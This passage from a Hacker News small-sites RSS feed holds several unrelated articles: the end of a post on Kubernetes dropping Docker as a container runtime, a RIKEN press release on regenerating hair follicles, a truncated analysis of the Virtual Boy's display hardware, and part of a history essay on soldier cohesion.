src="https://lh3.googleusercontent.com/qAs7sRi19J_vdE9NYNyZ5MZp8rFoV4aNUmn4aGtrc4zJXsgA_Not2cG68ut6XAXxVFAiBDyK-zp7FO6-sdcFv2obvfIxBrkcsawBisG7IKirWP4ODOlwP0kz1V9vNn_TbXAhaGKz" alt=""></figure><p>However, Kubernetes can use containerd directly as a container runtime, meaning Docker is no longer needed in this middle-man role. Docker still has a lot to offer, even in a Kubernetes ecosystem. It’s just not needed specifically as a container runtime.</p><figure><img src="https://lh4.googleusercontent.com/cNGPBxKBF4_Vm_WvKM4QWqXGrX4LqgaJfUUxVycD3d5XPuyXS8aWH8zeEooL--2MSDUhKzOmwCdYPGo6Zpga0xIk3EzyNq2fyDbHc0akoGLbBfnymOODbDPHh2zAhHzvdvsFxUxS" alt=""></figure><h2 id="h-what-s-the-role-of-docker-going-forward">What’s the Role of Docker Going Forward?</h2><p>Although Docker is not needed as a container runtime in Kubernetes, it still has a role to play in the Kubernetes ecosystem, and in your workflow.</p><p>Docker is still going strong as a tool for developing and building container images, as well as running them locally. Kubernetes can still run containers built using Docker’s <strong>Open Container Initiative (OCI) </strong>image format, meaning you can still use Dockerfiles and build your container images using Docker.</p><p>Kubernetes will also continue to be able to pull from Docker registries (such as Docker hub). This means that Docker will remain a powerful contender when it comes to managing the images once they are built.</p><p>All in all, Docker will continue to be a useful tool on your development workflows and continuous integration (CI) systems, even if you don’t need it to run your containers underneath Kubernetes in production.</p><hr><p><em>Looking to get certified on K8s? Read our <a href="https://acloudguru.com/blog/engineering/which-kubernetes-certification-path-should-i-take">blueprint for the Kubernetes certification journey</a>. </em></p><hr><h2 id="h-what-should-i-do">What Should I Do?</h2><p>&nbsp;If you are currently using Docker as a container runtime in your Kubernetes environment, you will need to make some changes. Moving forward, you can simply eliminate Docker as a middle-man in your Kubernetes environment. Instead, use another container runtime, such as <a href="https://containerd.io/">containerd</a> or <a href="https://cri-o.io/">CRI-O</a>.</p><p>Before upgrading to a Kubernetes version removes support for Docker (which is currently estimated to release in late 2021), you will need to modify (or replace) existing Kubernetes nodes so that they use a supported container runtime other than Docker. Starting now, you may want to start building any new nodes so that they use a non-Docker container runtime as well.</p><p>Other than that, nothing is really changing. You can continue to use Docker to build your images, as well as to run containers locally for development purposes, or in your continuous integration (CI) stack. You can also continue to use Docker registries to store and manage your images.</p><p>If you are interested in learning how to use containerd alongside Kubernetes, check out my new course, <a href="https://acloud.guru/overview/introduction-to-kubernetes">Introduction to Kubernetes</a>. It includes lessons that will walk you through the process of installing containerd and using it in your Kubernetes cluster.</p></div></div></div>]]>
            </description>
            <link>https://acloudguru.com/blog/engineering/kubernetes-is-deprecating-docker-what-you-need-to-know</link>
            <guid isPermaLink="false">hacker-news-small-sites-26118044</guid>
            <pubDate>Fri, 12 Feb 2021 20:14:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Compilation of interesting posts on productivity/procrastination]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26117739">thread link</a>) | @haishanqian
<br/>
February 12, 2021 | https://on.clew.ai/page/b15be8fc-8ed8-4872-943b-d234bebf6df0 | <a href="https://web.archive.org/web/*/https://on.clew.ai/page/b15be8fc-8ed8-4872-943b-d234bebf6df0">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://on.clew.ai/page/b15be8fc-8ed8-4872-943b-d234bebf6df0</link>
            <guid isPermaLink="false">hacker-news-small-sites-26117739</guid>
            <pubDate>Fri, 12 Feb 2021 19:44:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A recipe for cyclical regeneration of bioengineered hair]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26117598">thread link</a>) | @simonebrunozzi
<br/>
February 12, 2021 | https://www.riken.jp/en/news_pubs/research_news/pr/2021/20210210_3/index.html | <a href="https://web.archive.org/web/*/https://www.riken.jp/en/news_pubs/research_news/pr/2021/20210210_3/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="contents">
<main id="main">

<div>
<!-- main area -->

	 
<!-- メインエリア -->   
<p><b>Researchers at the RIKEN Center for Biosystems Dynamics Research in Japan have discovered a recipe for continuous cyclical regeneration of cultured hair follicles from hair follicle stem cells.</b></p>
<p>Scientists have been making waves in recent years by developing ways to grow a variety of useful items in laboratories, from meat and diamonds to retinas and other organoids. At the RIKEN Center for Biosystems Dynamics Research in Japan, a team led by Takashi Tsuji has been working on ways to regenerate lost hair from stem cells. In an important step, a new study identifies a critical population of hair follicle stem cells in the skin and a recipe for normal cyclical hair regeneration in the lab.</p>
<p>The researchers took fur and whisker cells from mice and cultured them in the laboratory with other biological “ingredients”. They used 220 combinations of ingredients, and found that combining a type of collagen with five factors — the NFFSE medium — led to the highest rate of stem cell amplification in the shortest period of time.</p>
<p>Hair growth in mammals is a continuous cyclical process in which hair grows, falls out, and is grown again. Growth occurs in the anagen phase and hair falls out in the telogen phase. Thus, a successful hair-regeneration treatment must produce hair that recycles. To test whether stem cells cultured in the NFFSE medium produce hair that cycles, the researchers placed bioengineered hair follicle stem cells in NFFSE medium or in medium missing one of the ingredients and observed the regenerated hair for several weeks. They found 81% of hair follicles generated in NFFSE medium went through at least three hair cycles and produced normal hair. In contrast, 79% of follicles grown in the other medium produced only one hair cycle.</p>
<p>Knowing that stem-cell renewal can depend on what is attached to the outside of the cells, the researchers next looked for markers on the surface of cells cultured in the NFFSE medium. In addition to the expected CD34 and CD49f markers, they found the best hair cycling was related to the addition of Itgβ5. “We found almost 80% of follicles reached three hair cycles when Itgβ5 was also bioengineered into the hair follicle germ,” explains first author Makoto Takeo. “In contrast, only 13% reached three cycles when it was not present.” Analysis showed that these important cells are naturally located in the upper part of the hair follicle’s bulge region.</p>
<p>“Our culture system establishes a method for cyclical regeneration of hair follicles from hair follicle stem cells,” says Tsuji, “and will help make hair follicle regeneration therapy a reality in the near future.” As preclinical animal-safety tests using these cultured cells were completed in 2019, the next step in the process is clinical trials.</p>
<p>“RIKEN is primarily an institute that does basic research,” explains Tsuji. “And clinical trials usually require outside collaborators. We are therefore looking for a partner company to help develop the clinical applications and welcome donations to promote the R&amp;D.”</p>
<h2 id="ReferenceSection">Reference</h2>
<p>Takeo  <span>et al</span>. (2021) <b>Expansion and characterization of epithelial stem cells with potential for cyclical hair regeneration. </b> <span>Sci Rep</span>. doi: <a href="https://doi.org/10.1038/s41598-020-80624-3">10.1038/s41598-020-80624-3</a></p>
<h2><b>Contact</b></h2>
<p>Takashi Tsuji, Team Leader<br>
  <a href="https://www.riken.jp/en/research/labs/bdr/organ_regen/">Laboratory for Organ Regeneration</a><br>
  <a href="https://www.riken.jp/en/research/labs/bdr/">RIKEN Center for Biosystems Dynamics Research</a></p>  
<p>Adam Phillips<br> RIKEN International Affairs Division<br> Tel: +81-(0)48-462-1225 / Fax: +81-(0)48-463-3687<br> Email: pr [at] riken.jp</p>
  <div id="fig1"><p><img src="https://www.riken.jp/news-pubs-en/research-news-en/2021-research-en/20210210_3_fig1.png" alt="Image of regenerated hair"></p><p><b>Regenerated hair cycles properly</b><br>
Top row: Hair regenerated using the NFFSE medium that contains five critical factors. Note the hair cycles 4 times (growth → falling out → new growth → repeat). Bottom row: Hair regenerated on medium missing one of the critical ingredients. Hair only cycled once in this case.</p> 
</div>  
<div id="fig2"><p><img src="https://www.riken.jp/news-pubs-en/research-news-en/2021-research-en/20210210_3_fig2.png" alt="Diagrams of fur and whisker"></p><p><b>Hair follicle stem cells important for proper hair cycles</b><br>
Diagram of back fur and whisker hair follicles. The study found that when Itgβ5 was present in hair follicle stem cells located in the upper bulge of the follicle, the hair went through many more cycles than when those cells were absent.</p> 
</div>  
<!-- /main -->
<!-- /main area -->
<!-- /.container01 --></div>
<!-- /#main --></main>
<!-- /#contents --></div></div>]]>
            </description>
            <link>https://www.riken.jp/en/news_pubs/research_news/pr/2021/20210210_3/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26117598</guid>
            <pubDate>Fri, 12 Feb 2021 19:32:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Virtual Boy Architecture: A Practical Analysis]]>
            </title>
            <description>
<![CDATA[
Score 44 | Comments 3 (<a href="https://news.ycombinator.com/item?id=26117584">thread link</a>) | @strangecasts
<br/>
February 12, 2021 | https://www.copetti.org/writings/consoles/virtual-boy/ | <a href="https://web.archive.org/web/*/https://www.copetti.org/writings/consoles/virtual-boy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div class="page"><nav id="navbar"></nav><h2>A Practical Analysis</h2><hr><div><ul><li><a href="#cover-model">Model</a></li><li><a href="#cover-motherboard">Motherboard</a></li><li><a href="#cover-diagram">Diagram</a></li></ul><div><div id="cover-motherboard"><figcaption>The mainboard<br>Not to be confused with the 'Servo board' which the mainboard connects to.<br>Virtual Sound Unit IC, 128 KB of DRAM and 64 KB of PSRAM are fitted on the back.</figcaption></div><div id="cover-diagram"><a href="https://www.copetti.org/images/consoles/virtualboy/diagram.png"><picture>
<img width="1185" height="1062" alt="Diagram" loading="auto" src="https://www.copetti.org/images/consoles/virtualboy/diagram.png"></picture></a><figcaption>Notice how the two screenshots have its background scenery slightly shifted horizontally</figcaption></div></div></div><hr><h2 id="a-quick-introduction">A quick introduction</h2><p>A console often summarised by its short lifespan and limited colour space. While technically correct, I believe these attributes tend to overlook other surprising properties.</p><p>In this article, I invite readers to learn more about its internal features, many of which became predominant in the market only after the Virtual Boy’s discontinuation.</p><hr><h2 id="display">Display</h2><p>The whole system is a curious piece of engineering. Externally, it resembles a bulky VR headset on a bipod. The player must place their head close to the eyepiece to see the game in action.</p><div><a href="https://www.copetti.org/images/consoles/virtualboy/case/front.f5ed2bf56afcaf7238bb81e26e42ea66a11e68a40b14581affc282e9ee25c268.png"><picture>
<img name="image_cover" alt="Image" width="1111" height="526" src="https://www.copetti.org/images/consoles/virtualboy/case/front.f5ed2bf56afcaf7238bb81e26e42ea66a11e68a40b14581affc282e9ee25c268.png" loading="auto"></picture></a><figcaption>This is as far as I get trying to shoot a photo of the display and the case at the same time. In reality, games look very crisp and in full size!</figcaption></div><p>Internally, it’s a whole different story (and a very complicated one too). For this reason, I thought it would be better to start by explaining how this console displays images and then go through the internal hardware.</p><h4 id="projecting-an-image">Projecting an image</h4><p>Once you switch the Virtual Boy on, you will start seeing two <strong>monochromatic red</strong> pictures (one for each eye) through the eyepiece. So far so good? Well, here is the interesting part: <strong>This console doesn’t have a screen</strong>, so what you see is more of an ‘illusion’ - Let’s dive deeper to know what’s going on.</p><p>The topics involved in explaining this (optics, visual phenomenons, etc) may feel difficult at first, but I constructed some interactive animations to make this section little more immersive.</p><div><ul><li id="tab-2-1-scanner-link"><a href="#tab-2-1-scanner">Scanner</a></li><li id="tab-2-2-mechanics-link"><a href="#tab-2-2-mechanics">Mechanics</a></li><li id="tab-2-3-display-link"><a href="#tab-2-3-display">Display</a></li><li id="tab-2-4-active-periods-link"><a href="#tab-2-4-active-periods">Active periods</a></li></ul><div><div id="tab-2-1-scanner"><h4>Scanner</h4><p>The large volume of this console can be attributed to the <strong>Scanner</strong>, which fills up a big part of it. The Scanner is the area of the Virtual Boy that displays images. It’s composed of two <strong>Display units</strong>, each one independently projects a frame (giving a total of two frames, one per eye).</p><p>A Display unit is where all the ‘magic’ happens, it’s made of the following components:</p><ul><li>An <strong>LED Unit</strong>: Contains 224 red LEDs stacked vertically and the necessary circuitry to control each one of them.</li><li>A <strong>Lens</strong>: Refracts the light coming from the LEDs.<ul><li>At the top of the Virtual Boy’s case, there is a <strong>Focus slider</strong> used to shift the lenses closer or further away from the LEDs. This allows the user to adapt the console to their focal length (preventing blurry images).</li></ul></li><li>A <strong>Mirror</strong>: Reflects the light coming from the lens and directs them to the user’s eyes. Furthermore, this component will be constantly oscillating thanks to a <strong>Voice coil motor</strong> connected to it. The motor is managed by the <strong>Servo control</strong>, a separate board which sends electrical pulses at 50 Hz.<ul><li>All in all, this is a very complex and fragile area of the console, so there’s a photo interrupter (a type of photosensor) installed. This reports the oscillation observed from the mirror to the Servo control, which in turns monitors the oscillations and applies the necessary corrections.</li></ul></li></ul><p>Next to the focus slider there is a <strong>IPD dial</strong> (knob-shaped switch), which adjust the distance between the two Display units. This is done to adapt the displays to the user’s inter-pupil distance.</p></div><div id="tab-2-2-mechanics"><h4>Mechanics</h4><div><figcaption>Basic representation of the angle of the oscillating mirror over time (at a very slow motion)<br>The left and right LEDs are operating (active) during the red and blue period, respectively<br>During the grey period, no LED is operating (idle)<br>For sake of simplicity, the angular velocity represented here is constant (but not in the real world)</figcaption></div><p>Now that we have each component identified, let’s take a look how the Virtual Boy manages to show images to our eyes.</p><p>If you haven’t noticed before, there <strong>isn’t any dot-matrix display to be found</strong>, so why are we seeing two-dimensional images from the eyepiece? Similarly to the functioning of a CRT monitor, Display units play with the way we perceive images:</p><ul><li>The fact the mirrors oscillate enables a single column of LEDs to displace horizontally between our field of view. The angle of the mirror is strategically directed to place the LEDs on 384 different ‘column positions’ distributed across our field of view.</li><li>Human vision is logarithmic and the mirror oscillates at <strong>50 Hz</strong> (each period takes 20 ms). This is so fast we end up perceiving 384 columns of LEDs illuminating at the same time (afterimage effect) until the mirror stops oscillating.</li><li>All of this is perfectly synchronised with the LED controller, which updates each LED bulb every time the mirror is slightly moved. Thus, we end up seeing a full picture coming from the eyepiece.</li></ul><p>In practice, there are some conditions for all these principles to work:</p><ul><li>The LEDs must only operate when the angular velocity of the mirror is stable (in other words, not when the mirror is changing direction). This can be thought of as the <a href="https://www.copetti.org/writings/consoles/master-system/#tab-2-4-result"><strong>Active State</strong></a> of a CRT monitor.</li><li>In relation to the previous point, the angular velocity of the mirror can’t stay constant (since the mirror can’t change direction instantly, the periods considered ‘stable’ will be subject to forces that will disrupt its velocity). To remedy this, the Virtual Boy stores a list of values in memory called <strong>Column Table</strong> which instructs how much time to dedicate for each column interval, in an effort to balance out excessive &amp; insufficient periods of ‘LED column’ exposure.</li><li>Let’s not forget that this whole process has to be done twice since we got two display units (one per eye). Unfortunately, both units can’t pull energy and data at the same time, so each one operates at different display periods (out-of-phase, 10ms apart). We don’t notice this (another illusion!).</li></ul></div><div id="tab-2-3-display"><h4>Display</h4><div><figcaption>Simplified representation of how the first LED unit operates during specific periods of time. Notice how the LEDs will start displaying each column of the frame-buffer during active periods.</figcaption></div><p>Contrary to previous video chips modelled after CRT displays (i.e. <a href="https://www.copetti.org/writings/consoles/nes/#graphics">PPU</a> and <a href="https://www.copetti.org/writings/consoles/master-system/#graphics">VGP</a>), graphics on the Virtual Boy are <strong>not rendered on-the-fly</strong>. The graphics chip on this console sends the processed frame to a frame-buffer in memory, each column of the frame is then sent to the LED array for display.</p><p>Once the Servo board detects it’s time for display, the graphics chip will start sending columns of pixels from the frame-buffer to those 224 vertically-stacked LEDs, one-by-one in a strategically synchronised matter so the LEDs will have shown 384 columns during the display period. Hence, the ‘screen resolution’ of this console is 384x224 pixels.</p><p>Moreover, we need to store two frame-buffers since each one will go to a different display unit. The graphics subsystem also employs double-buffering and other quirks (mentioned later in the ‘Graphics’ section). So, for now, just remember how a digital frame is sent to the LEDs.</p></div><div id="tab-2-4-active-periods"><h4>Active periods</h4><div><figcaption>Another simplified animation, this time showing how the oscillation of the mirror deviates the LEDs light in a way the user will end up seeing a proper frame</figcaption></div><p>Consequently of this design, there are going to be periods of:</p><ul><li><strong>Active Display</strong> during which the LEDs are pulling an image from the frame-buffer and nothing can disrupt it.</li><li><strong>Active Display 2</strong>: Same as before but now the other Display unit is operating.</li><li><strong>Drawing idle</strong>: A period where none of the LEDs are operating and the angular velocity of the mirror is unstable.</li></ul><p>This cycle is repeated 50 times per second (hence the 50 Hz refresh rate). That means that for every frame, the CPU and GPU would have around 10ms worth of time to update the picture that the user will see. In reality, Nintendo’s engineers implemented something more sophisticated. Again, I’ll try to explain this with more depth in the ‘Graphics’ section. But for now I hoped you got a good understanding of how the Virtual Boy cleverly managed to produce a picture with inexpensive hardware.</p></div></div></div><p>This has been a quick explanation of how optics can turn a single vertical line into a picture. If you own or have read about the Virtual Boy before, you may be wondering when the three-dimensional imagery takes place. I just want to make it clear that none of the previous explanation have a connection with that effect. I’m mentioning this because in the past I’ve seen many places arguing that the oscillating mirrors are the cause of the ‘depth perception’, however, with all the information I’ve gathered in this study, I don’t think that claim is accurate.</p><p>That being said, I think it’s time we discuss the 3D phenomenon…</p><h4 id="creating-a-third-dimensional-vision">Creating a third-dimensional vision</h4><p>During the marketing of the Virtual Boy, there was a lot of fanfare regarding the fact this console could project a ‘3D world’. I’m not referring to images with 3D polygons stamped (like the other 5th gen. consoles), but the actual perception of depth.</p><p>In a nutshell, the Virtual Boy relies on <strong>Stereoscopic images</strong> to carry out that illusion. So this system wasn’t only capable of toying with our vision to project a full image, but it also did it in a way we would think certain drawings are closer/far away from others!</p><div><div><figcaption>Snapshot of the game seen from the different display units<br>Mario's Tennis (1995)</figcaption></div><p>The technique is very simple: Each of the two frames displayed (one on each eye) will have some elements slightly shifted horizontally, so when we try to see them with our two eyes, our brain will think they are nearer than others. This depends on the direction the elements are shifted.</p><p>Objects shifted towards the centre of your eyes (moved right on the left frame and moved left on the right frame) will appear closer, objects shifted away from the center of your eyes will appear further away. Finally, objects with no shifting will appear between the two other. This approach is called <strong>Stereoscopic parallax</strong>.</p></div><p>One of the drawbacks of stereoscopy is <strong>eyestrain</strong>. This was alleviated by the fact games provided an ‘automatic pause’ system which reminded the user to take breaks every 30 min. Nintendo also wrote down various warning messages in their packaging and …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.copetti.org/writings/consoles/virtual-boy/">https://www.copetti.org/writings/consoles/virtual-boy/</a></em></p>]]>
            </description>
            <link>https://www.copetti.org/writings/consoles/virtual-boy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26117584</guid>
            <pubDate>Fri, 12 Feb 2021 19:31:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Universal Warrior, Part IIb: A Soldier’s Lot]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26117386">thread link</a>) | @parsecs
<br/>
February 12, 2021 | https://acoup.blog/2021/02/12/collections-the-universal-warrior-part-iib-a-soldiers-lot/ | <a href="https://web.archive.org/web/*/https://acoup.blog/2021/02/12/collections-the-universal-warrior-part-iib-a-soldiers-lot/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>This is the continuation of the second part of a three part (<a href="https://acoup.blog/2021/01/29/collections-the-universal-warrior-part-i-soldiers-warriors-and/">I</a>, <a href="https://acoup.blog/2021/02/05/collections-the-universal-warrior-part-iia-the-many-faces-of-battle/">IIa</a>, III) discussion of the notion that there is a ‘universal warrior’ – a transcendent sameness about either the experience of war or ‘warrior values’ which might provide some sort of useful blueprint for life generally or some sort of fundamental truth about the experience of war.</p>



<p><a href="https://acoup.blog/2021/02/05/collections-the-universal-warrior-part-iia-the-many-faces-of-battle/">We started this section last week </a>by looking at the forms of war along with the direct emotional experience of combat.  What we found is that, quite to the contrary of there being just one sort of war that ‘never changes,’ there are in fact multiple <em>systems</em> of war that function quite differently (with considerable variation both within and between those systems) to the point that armies often find opponents working from within a different system of war almost utterly alien to them.</p>



<p>Moreover, as we discussed, the experience of battle, not merely the technology, tactics and circumstances, but the <em>raw emotional experience</em> (taken in terms of courage and fear) wasn’t constant either.  Different cultures understood ‘courage’ differently (and we must remember that translation here can be deceiving – most of them didn’t understand ‘courage’ at all, they understood <em>andreia</em> or <em>fortis </em>or <em>corage</em> or <em>der Mut</em> or <em>woohitike</em> which are, in the end, subtly different things and so not quite ever exactly courage at all) and different battles imposed different sorts of fear which strained those combatants in different ways.</p>



<p>Now we’re going to keep soldiering on and look at some of the other factors of the war experience: the importance of comrades, the drudgery and toil of war, and of course wounds (both physical and mental) and their healing.  Once again, to abuse the opening lines of the <em>Fallout</em> series, we going to ask if it is really true that “War, war never changes.”</p>



<figure><img data-attachment-id="6241" data-permalink="https://acoup.blog/fallout-4/" data-orig-file="https://acoupdotblog.files.wordpress.com/2021/02/fallout-4.png" data-orig-size="1055,578" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="fallout-4" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2021/02/fallout-4.png?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2021/02/fallout-4.png?w=1024" src="https://acoupdotblog.files.wordpress.com/2021/02/fallout-4.png?w=1024" alt="" srcset="https://acoupdotblog.files.wordpress.com/2021/02/fallout-4.png?w=1024 1024w, https://acoupdotblog.files.wordpress.com/2021/02/fallout-4.png?w=150 150w, https://acoupdotblog.files.wordpress.com/2021/02/fallout-4.png?w=300 300w, https://acoupdotblog.files.wordpress.com/2021/02/fallout-4.png?w=768 768w, https://acoupdotblog.files.wordpress.com/2021/02/fallout-4.png 1055w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>The iconic introduction line from all of the Fallout games (this is the version from Fallout 4.<br>As we’re going to see, this <strong>sounds</strong> true, but isn’t.  War changes quite a lot.</figcaption></figure>



<p>But first, as always, if you like what you are reading here, please share it; if you really like it, you can support me on <a href="https://www.patreon.com/user?u=20122096">Patreon</a>. And if you want updates whenever a new post appears, you can click below for email updates or follow me on twitter (@BretDevereaux) for updates as to new posts as well as my occasional ancient history, foreign policy or military history musings.</p>






<h2>The Ties that Bind</h2>



<p>What about the personal relationships that are formed in the context of conflict?  Surely, the ‘band of brothers’ is a truly universal experience, right (<a href="https://youtu.be/76_Q9ruJfrE">but note on the complexities of Shakespeare’s <em>Henry V</em></a>)?  Surely the social bonds that held<a href="https://en.wikipedia.org/wiki/Band_of_Brothers_(miniseries)"> Easy-Company</a> together in 1944 and 1945 are the same as those from 1415?  Or 415?</p>



<p>Well, no.  Not quite.</p>



<p>We can approach this question through the idea of cohesion – the moral force that holds a group of combatants together on the battlefield under the intense emotional stresses of combat.  The intense bonds that soldiers form in modern armies (particularly those in the European pattern) are not an accident, but a core part of how those armies, institutionally, seek to build cohesion.  Going back to last week, we discussed briefly the emergence of the extensively drilled and disciplined ‘mechanical’ soldier of Early Modern Europe, noting that this approach wasn’t necessary for the effective use of firearms (the Ottoman Janissaries, for instance, were quite good with firearms, but were not trained and organized in this way), but rather was a product of elite aristocratic (read: officer) disdain for their up-jumped peasant soldiers and thus the assumption by those aristocrats that the only way to get such men to fight effectively was to relentlessly drill them.</p>



<figure><img data-attachment-id="6231" data-permalink="https://acoup.blog/hohenfriedeberg_-_attack_of_prussian_infantry_-_1745/" data-orig-file="https://acoupdotblog.files.wordpress.com/2021/02/hohenfriedeberg_-_attack_of_prussian_infantry_-_1745.jpg" data-orig-size="723,351" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="hohenfriedeberg_-_attack_of_prussian_infantry_-_1745" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2021/02/hohenfriedeberg_-_attack_of_prussian_infantry_-_1745.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2021/02/hohenfriedeberg_-_attack_of_prussian_infantry_-_1745.jpg?w=723" src="https://acoupdotblog.files.wordpress.com/2021/02/hohenfriedeberg_-_attack_of_prussian_infantry_-_1745.jpg?w=723" alt="" srcset="https://acoupdotblog.files.wordpress.com/2021/02/hohenfriedeberg_-_attack_of_prussian_infantry_-_1745.jpg 723w, https://acoupdotblog.files.wordpress.com/2021/02/hohenfriedeberg_-_attack_of_prussian_infantry_-_1745.jpg?w=150 150w, https://acoupdotblog.files.wordpress.com/2021/02/hohenfriedeberg_-_attack_of_prussian_infantry_-_1745.jpg?w=300 300w" sizes="(max-width: 723px) 100vw, 723px"><figcaption><a href="https://en.wikipedia.org/wiki/Prussian_Army#/media/File:Hohenfriedeberg_-_Attack_of_Prussian_Infantry_-_1745.jpg">Via Wikipedia</a>, the Attack of Prussian Infantry, 4 June 1745 by Carl Röchling (1855-1920)</figcaption></figure>



<p>Now the funny thing about this system is that it clearly <em>worked</em>, but not for the reasons its aristocratic pioneers believed.  It was only really after the Second World War that systematic study began to be made of unit cohesion (e.g. S.L.A. Marshall, <em>Men Against Fire</em> (1947), though subsequent literature on the topic is voluminous and Marshal’s work has its problems, but its conclusions are broadly accepted having been confirmed in subsequent studies).  What emerged quite clearly was that it wasn’t ‘the cause’ or patriotism that held troops together under fire, but group cohesion born out of an intense need not to let fellow soldiers in the unit down.  In short, what held units together and made them fight more effectively was (in part, there are many conclusions in <em>Men Against Fire</em>) the strong social bonds between comrades.</p>



<p>And, in fact, the drill and discipline of early modern European armies unintentionally did quite a lot of cohesion building things.  Soldiers were removed from civilian society (isolation from larger groups builds unit cohesion), split into very small groups (keeping the core group that coheres below <a href="https://en.wikipedia.org/wiki/Dunbar%27s_number">Dunbar’s number</a> aids in group cohesion; thus <a href="https://youtu.be/a15gihWu1SM">why the platoon is a natural unit size</a>) and then pushed through difficult and unpleasant training (that drill and discipline) creating a sense of unique shared experience and sacrifice.  All of which doesn’t render men <em>machines</em>, but it does create strong social bonds within the units that will keep the men fighting even when they care little for their cause (which they generally did in this period; one does not find a super-abundance of patriotism among, say, the Army of Flanders).</p>



<p>And there is a tendency to point to this cohesion, its modern source in ‘toughening’ boot camp and to say, ‘aha!  That is the true universal about effective soldier-warriors!’  Except – and you knew there was going to be an except – except it isn’t.  Systems built on the use of drill and discipline for the development of unit cohesion through social bonds are actually, historically speaking, quite rare.  We see systems like that in use by the Romans from the Middle Republic forward (but significantly faded by the end of late antiquity; the Byzantine army doesn’t seem to function this way), in China from the Han Dynasty onward, in Japan for the <em>ashigaru</em> infantry from the Sengoku period, and in Europe from the Early Modern period.  That <em>sounds</em> like a lot, but that is relatively small minority of the historical period and even then in a relatively small minority of places.  It is, for instance, a period that only covers about half of the historical period in Western Europe, the place most often associated with this very system of organization (though that association is perhaps unfair to East Asia).</p>



<p>Instead, most societies relied on existing social bonds formed <em>outside</em> of the experience of war for cohesion.  Greek hoplite armies, for instance, generally formed up by <em>polis</em> (read: city) and then within those blocks by still smaller and smaller social divisions, so that family and neighbors would be standing shoulder to shoulder in the battle line (Sparta does this through the system of communal messes, the <em>syssitia</em>, but the idea that you fought alongside the men you dined with socially – your neighbors, generally – was perfectly normal in most Greek cities).  That was intentional – it allowed the phalanx to cohere through the social pressure not to be seen as a coward before the men who meant the most to you, whose shaming gaze you would have to endure in civilian life.  The same pressures, by the well, held together the (mostly volunteer) armies of the American Civil War (on this, see, McPherson, <em>For Cause and Comrades</em> (1997)).</p>



<p>By contrast, ‘warrior’ classes often rely on a sort of class solidarity along with the demand of an individual military aristocrat to be <em>individually</em> militarily excellent.  Richard Kaeuper quips of the literature of the medieval knightly class that it was filled with “utterly tireless, almost obsessional emphasis placed on personal prowess” (R.W. Kaeuper, <em>Chivalry and Violence in Medieval Europe</em> (1999)).  We’ve talked a fair bit about the values of mounted aristocrats, both in <a href="https://acoup.blog/2020/04/16/collections-a-trip-through-bertran-de-born-martial-values-in-the-12th-century-occitan-nobility/">their </a><a href="https://acoup.blog/2020/04/10/collections-antarah-ibn-shaddad-victory-songs/">role </a>as combatants and <a href="https://acoup.blog/2020/06/12/collections-the-battle-of-helms-deep-part-vii-hanging-by-a-thread/">in their roles as generals </a>and those values are relatively disconnected from discipline-induced forms of buddy-cohesion.  Of course exactly what ‘good generalship’ or ‘good officership’ looks like varies wildly from place to place – Alexander was expected to command his cavalry from the front; Roman emperors rarely took the battlefield and when they did they commanded from the rear since it would be foolish to risk the ‘brain’ of the army in personal combat and in any event someone at the front of a cavalry charge can hardly direct the rest of the army.</p>



<p>One of the things I find most striking about the ‘warrior ethos’ advanced by writers like Pressfield is that it accepts as normal the unique nature of the bonds that hold soldiers together in battle, assuming this bond and its shared sacrifice to be at once unique to combat and also transcendent to all combatants.  But one of the key points made very well in Sebastian Junger’s <em>War </em>(2010) and later <em>Tribe</em> (2016) is just how <em><strong>strange</strong></em> that experience is, historically.  <strong>Junger notes that in earlier societies, soldiers would have returned from war into communities </strong>(often small, agricultural communities or tribal communities) <strong>every bit as close-knit as the infantry platoon – and indeed, often involving <em>literally the same people</em> as the infantry platoon</strong>.  Instead, the intense feeling of uniqueness that modern soldiers feel about the bonds of combat is because of the historically unusual deracination produced by modern societies by the industrial revolution and the post-industrial period.</p>



<p>And Junger’s point is born out quite clearly when looking at the myriad of historical societies where those non-combat social bonds were the basis of the principles of military cohesion, be it the small-town cohesion of the hoplite phalanx or the class-based-expectation cohesion of a group of knights, or (for that matter) later modern …</p></div></div>
